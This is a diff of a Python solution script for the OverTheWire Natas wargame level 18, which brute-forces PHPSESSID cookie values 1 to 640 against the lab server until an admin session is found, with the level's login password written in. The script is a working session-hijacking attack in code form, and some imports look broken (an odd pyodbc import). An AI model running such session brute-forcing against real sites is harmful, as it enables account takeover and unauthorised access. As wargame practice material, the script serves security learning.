@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 '''
-3:37
 Level 18 → Level 19
-TIMING ATTACK SQL Injection
+Bruteforcing PHPSESSID
 
 github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas18.py
 
@@ -16,35 +15,38 @@ password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
 problem:
 
 write up:
-
-
-
-Manual Mode
-
-
-'''
+ We need to find the session_id for the administer in the range (1, 641)
+ once we find the correct id number the password  will be output
+ '''
 import string
 
 import requests
+#pip uninstall uuid pip install uuid
 import re
 from string import *
 
 from time import *
-
-characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
-print(characters)
-
 from pyodbc import lowercase
 
-username = 'natas18'
 username = 'natas18'
 password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
 
 url = 'http://%s.natas.labs.overthewire.org/' % username
-
+#url = 'http://%s.natas.labs.overthewire.org/index-source.html' % username
 session = requests.Session()
 response = session.get(url, auth = (username, password) )
 
 content = response.text
 
 print (content)
+
+for session_id in range(1, 641):
+	response = session.get(url, cookies = {"PHPSESSID": str(session_id)}, auth = (username, password) )
+	content = response.text
+
+	if ( "You are an admin" in content ):
+		print ("Got it!", session_id)
+		print (content)
+		break
+	else:
+		print ("trying", session_id)
